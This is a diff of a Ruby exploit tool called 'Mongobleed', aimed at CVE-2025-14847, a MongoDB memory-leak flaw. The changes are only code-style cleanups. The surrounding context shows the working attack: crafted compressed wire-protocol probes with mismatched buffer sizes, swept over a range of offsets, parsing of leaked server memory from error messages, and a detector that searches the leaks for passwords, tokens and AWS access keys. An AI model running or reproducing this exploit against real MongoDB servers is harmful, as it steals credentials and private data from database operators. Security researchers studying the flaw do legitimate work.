@@ -117,7 +117,7 @@ module CVE202514847
       compressed = @compressor.compress(op_msg)
       op_compressed = @protocol_builder.build_op_compressed(
         compressed_data: compressed,
-        buffer_size: buffer_size
+        buffer_size: buffer_size,
       )
       @header_builder.build(op_compressed.bytesize) + op_compressed
     end
@@ -189,7 +189,7 @@ module CVE202514847
 
   # Leaked data surfaces in BSON parsing error messages after decompression.
   class ResponseDecompressor
-    MIN_RESPONSE_SIZE = 25  # 16-byte header + 9-byte OP_COMPRESSED envelope minimum
+    MIN_RESPONSE_SIZE = 25 # 16-byte header + 9-byte OP_COMPRESSED envelope minimum
     OPCODE_COMPRESSED = 2012
 
     def initialize(response)
@@ -197,7 +197,7 @@ module CVE202514847
     end
 
     def decompress
-      return nil if @response.bytesize < MIN_RESPONSE_SIZE
+      return if @response.bytesize < MIN_RESPONSE_SIZE
 
       msg_len = @response[0..3].unpack1("L<")
 
@@ -223,7 +223,7 @@ module CVE202514847
   class LeakParser
     FIELD_NAME_PATTERN = /field name '([^']*)'/
     TYPE_PATTERN = /type (\d+)/
-    IGNORED_FIELDS = ["?", "a", "$db", "ping"].freeze  # Filter out our probe payload
+    IGNORED_FIELDS = ["?", "a", "$db", "ping"].freeze # Filter out our probe payload
 
     def initialize(raw_data)
       @raw_data = raw_data
@@ -282,23 +282,23 @@ module CVE202514847
 
     def print_banner
       puts
-      puts "#{"=" * 60}".cyan
+      puts ("=" * 60).to_s.cyan
       puts "  Mongobleed - CVE-2025-14847 MongoDB Memory Leak".bold
       puts "  Author: Demetrius Ford - github.com/demetriusford".light_black
-      puts "#{"=" * 60}".cyan
+      puts ("=" * 60).to_s.cyan
       puts
     end
 
     def print_header(host:, port:, min_offset:, max_offset:)
       print_banner
       puts "#{"[*]".blue} Target: #{"#{host}:#{port}".bold}"
-      puts "#{"[*]".blue} Offset range: #{"#{min_offset}".bold} to #{"#{max_offset}".bold}"
+      puts "#{"[*]".blue} Offset range: #{min_offset.to_s.bold} to #{max_offset.to_s.bold}"
       puts "#{"[*]".blue} Starting memory scan..."
       puts
     end
 
     def print_leak(data:, offset:)
-      return unless data.bytesize > MIN_DISPLAY_SIZE
+      return if data.bytesize <= MIN_DISPLAY_SIZE
 
       preview = data[0...PREVIEW_LENGTH]
         .force_encoding(Encoding::UTF_8)
@@ -311,11 +311,11 @@ module CVE202514847
 
     def print_summary(total_bytes:, unique_count:, output_path:)
       puts
-      puts "#{"=" * 60}".cyan
+      puts ("=" * 60).to_s.cyan
       puts "#{"[*]".blue} Scan complete!"
       puts
       puts "#{"[*]".blue} Total leaked data: #{"#{total_bytes} bytes".green}"
-      puts "#{"[*]".blue} Unique fragments: #{"#{unique_count}".green}"
+      puts "#{"[*]".blue} Unique fragments: #{unique_count.to_s.green}"
       puts "#{"[*]".blue} Output saved to: #{output_path.bold}"
     end
 
@@ -325,9 +325,9 @@ module CVE202514847
 
     def print_secrets_header
       puts
-      puts "#{"-" * 60}".yellow
+      puts ("-" * 60).to_s.yellow
       puts "#{"[!]".yellow} Scanning for sensitive patterns..."
-      puts "#{"-" * 60}".yellow
+      puts ("-" * 60).to_s.yellow
     end
 
     def print_no_secrets
@@ -335,7 +335,7 @@ module CVE202514847
     end
 
     def print_secrets_footer
-      puts "#{"-" * 60}".yellow
+      puts ("-" * 60).to_s.yellow
     end
   end
 
@@ -346,7 +346,7 @@ module CVE202514847
   end
 
   class SecretDetector
-    SECRET_PATTERNS = %w[password secret key token admin AKIA].freeze  # AKIA = AWS access keys
+    SECRET_PATTERNS = ["password", "secret", "key", "token", "admin", "AKIA"].freeze # AKIA = AWS access keys
 
     def initialize(data)
       @data = data
@@ -403,7 +403,7 @@ module CVE202514847
       (@min_offset...@max_offset).each do |doc_len|
         response = @memory_probe.send_probe(
           doc_len: doc_len,
-          buffer_size: doc_len + BUFFER_SIZE_OFFSET
+          buffer_size: doc_len + BUFFER_SIZE_OFFSET,
         )
         leaks = @leak_extractor.extract(response)
 
@@ -457,7 +457,7 @@ module CVE202514847
       @output_formatter.print_summary(
         total_bytes: @results.total_bytes,
         unique_count: @results.unique_count,
-        output_path: @output_path
+        output_path: @output_path,
       )
     end
 
@@ -533,8 +533,8 @@ module CVE202514847
       workflow = build_workflow
       workflow.execute
     rescue Error => e
-      warn "#{"[-]".red} Error: #{e.message}"
-      exit 1
+      warn("#{"[-]".red} Error: #{e.message}")
+      exit(1)
     end
 
     private
@@ -544,7 +544,7 @@ module CVE202514847
         host: @options[:host],
         port: @options[:port],
         min_offset: @options[:min_offset],
-        max_offset: @options[:max_offset]
+        max_offset: @options[:max_offset],
       )
     end
 
@@ -555,7 +555,7 @@ module CVE202514847
         output_formatter: @output_formatter,
         file_writer: FileWriter.new,
         secret_detector_class: SecretDetector,
-        output_path: @options[:output]
+        output_path: @options[:output],
       )
     end
 
@@ -564,14 +564,14 @@ module CVE202514847
         min_offset: @options[:min_offset],
         max_offset: @options[:max_offset],
         memory_probe: build_memory_probe,
-        leak_extractor: build_leak_extractor
+        leak_extractor: build_leak_extractor,
       )
     end
 
     def build_memory_probe
       MemoryProbe.new(
         network_client: build_network_client,
-        payload_builder: build_payload_builder
+        payload_builder: build_payload_builder,
       )
     end
 
@@ -580,7 +580,7 @@ module CVE202514847
         host: @options[:host],
         port: @options[:port],
         socket_factory: SocketFactory.new,
-        socket_reader: SocketReader.new
+        socket_reader: SocketReader.new,
       )
     end
 
@@ -589,21 +589,23 @@ module CVE202514847
         bson_builder: BSONBuilder.new,
         protocol_builder: WireProtocolBuilder.new,
         compressor: Compressor.new,
-        header_builder: HeaderBuilder.new
+        header_builder: HeaderBuilder.new,
       )
     end
 
     def build_leak_extractor
       LeakExtractor.new(
         decompressor: ResponseDecompressor,
-        parser: LeakParser
+        parser: LeakParser,
       )
     end
   end
 
   class CLI
-    def self.run
-      new.run
+    class << self
+      def run
+        new.run
+      end
     end
 
     def run
